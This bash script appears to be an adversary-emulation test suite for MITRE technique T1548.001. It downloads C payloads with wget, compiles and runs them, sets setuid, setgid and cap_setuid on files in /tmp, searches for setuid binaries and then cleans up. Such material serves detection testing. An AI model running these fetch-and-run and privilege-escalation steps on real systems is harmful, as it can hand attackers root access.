#! /bin/bash

# T1548.001 - Abuse Elevation Control Mechanism: Setuid and Setgid

function a() {
    # Atomic Test 1 - Make and modify binary from C source
    wget -O /tmp/hello.c https://raw.githubusercontent.com/blueteamdefendersco/redatomics/main/atomic_scripts/linux/defense_evasion/payloads/hello.c
    sudo chown root /tmp/hello.c
    sudo make /tmp/hello
    sudo chown root /tmp/hello
    sudo chmod u+s /tmp/hello
    /tmp/hello
    sleep 60
}

function b() {
    # Atomic Test 1 - Make and modify binary from C source
    wget -O /tmp/hello2.c https://raw.githubusercontent.com/blueteamdefendersco/redatomics/main/atomic_scripts/linux/defense_evasion/payloads/hello.c
    make /tmp/hello2
    chmod u+s /tmp/hello2
    /tmp/hello2
    sleep 60
}

function c() {
    # Atomic Test 2 - Set a SetUID flag on file
    touch /tmp/evilBinary
    chmod u+xs /tmp/evilBinary
    sleep 60
}

function d() {
    # Atomic Test 2 - Set a SetUID flag on file
    sudo touch /tmp/evilBinary2
    sudo chown root /tmp/evilBinary2
    sudo chmod u+xs /tmp/evilBinary2
    sleep 60
}

function e() {
    # Atomic Test 3 - Set a SetGID flag on file
    sudo touch /tmp/evilBinary3
    sudo chown root /tmp/evilBinary3
    sudo chmod g+xs /tmp/evilBinary3
    sleep 60
}

function f() {
    # Atomic Test 3 - Set a SetGID flag on file
    touch /tmp/evilBinary4
    chmod g+xs /tmp/evilBinary4
    sleep 60
}


function g() {
    # Atomic Test 4 - Make and modify capabilities of a binary
    wget -O /tmp/cap.c https://raw.githubusercontent.com/blueteamdefendersco/redatomics/main/atomic_scripts/linux/defense_evasion/payloads/cap.c
    make /tmp/cap
    sudo setcap cap_setuid=ep /tmp/cap
    /tmp/cap
    sleep 60
}

function h() {
    # Atomic Test 5 - Provide the SetUID capability to a file
    touch /tmp/evilBinary5
    sudo setcap cap_setuid=ep /tmp/evilBinary5
    sleep 60
}

function i() {
# Atomic Test 6 - Do reconnaissance for files that have the setuid bit set
    find /usr/bin -perm -4000
    sleep 60
}

function j() {
# Atomic Test 7 - Do reconnaissance for files that have the setgid bit set
    find /usr/bin -perm -2000
    sleep 60
}

function k() {
    touch /tmp/evilBinary6
    chmod 4777 /tmp/evilBinary6
    sleep 60
}

function l() {
    touch /tmp/evilBinary7
    chmod 2775 /tmp/evilBinary7
    sleep 60
}

function z() {
    # Clean up everything
    sudo rm /tmp/hello
    rm /tmp/hello2
    rm /tmp/evilBinary
    sudo rm /tmp/evilBinary2
    sudo rm /tmp/evilBinary3
    rm /tmp/evilBinary4
    sudo rm /tmp/cap
    sudo rm /tmp/evilBinary5
    rm /tmp/evilBinary6
    rm /tmp/evilBinary7
    sleep 60
}

a
b
c
d
e
f
g
h
i
j
k
l
z


